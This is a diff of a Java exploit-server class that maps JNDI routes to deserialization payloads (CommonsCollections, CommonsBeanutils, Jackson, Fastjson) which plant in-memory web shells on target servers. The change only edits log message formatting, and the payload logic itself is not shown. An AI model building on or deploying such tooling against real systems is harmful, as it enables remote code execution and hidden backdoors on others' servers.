@@ -55,7 +55,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/CommonsCollectionsK1/MemShell/{server}/{tool}/{type}")
     public byte[] CommonsCollectionsK1MemShell(String server, String tool, String type) throws Exception {
-        System.out.println("[Deserialize] [CommonsCollectionsK1] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+        System.out.println("[Deserialize] [CommonsCollectionsK1] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
         GenerateResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
@@ -82,7 +82,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/CommonsCollectionsK2/MemShell/{server}/{tool}/{type}")
     public byte[] CommonsCollectionsK2MemShell(String server, String tool, String type) throws Exception {
-        System.out.println("[Deserialize] [CommonsCollectionsK2] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+        System.out.println("[Deserialize] [CommonsCollectionsK2] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
         GenerateResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
@@ -123,7 +123,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/CommonsBeanutils183/MemShell/{server}/{tool}/{type}")
     public byte[] CommonsBeanutils183MemShell(String server, String tool, String type) throws Exception {
-        System.out.println("[Deserialize] [CommonsBeanutils183] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+        System.out.println("[Deserialize] [CommonsBeanutils183] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
         GenerateResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
@@ -150,7 +150,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/CommonsBeanutils194/MemShell/{server}/{tool}/{type}")
     public byte[] CommonsBeanutils194MemShell(String server, String tool, String type) throws Exception {
-        System.out.println("[Deserialize] [CommonsBeanutils194] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+        System.out.println("[Deserialize] [CommonsBeanutils194] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
         GenerateResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
@@ -177,7 +177,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/Jackson/MemShell/{server}/{tool}/{type}")
     public byte[] JacksonMemShell(String server, String tool, String type) throws Exception {
-        System.out.println("[Deserialize] [Jackson] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+        System.out.println("[Deserialize] [Jackson] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
         GenerateResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
@@ -204,7 +204,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/Fastjson1/MemShell/{server}/{tool}/{type}")
     public byte[] Fastjson1MemShell(String server, String tool, String type) throws Exception {
-        System.out.println("[Deserialize] [Fastjson1] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+        System.out.println("[Deserialize] [Fastjson1] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
         GenerateResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
@@ -231,7 +231,7 @@ public class DeserializeController implements Controller {
 
     @JNDIMapping("/Fastjson2/MemShell/{server}/{tool}/{type}")
     public byte[] Fastjson2MemShell(String server, String tool, String type) throws Exception {
-        System.out.println("[Deserialize] [Fastjson2] [MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
+        System.out.println("[Deserialize] [Fastjson2] [MemShell] Server: " + server + " Tool: " + tool + " Type: " + type);
 
         GenerateResult result = MemShellPayload.generate(server, tool, type);
         MemShellPayload.printInfo(result);
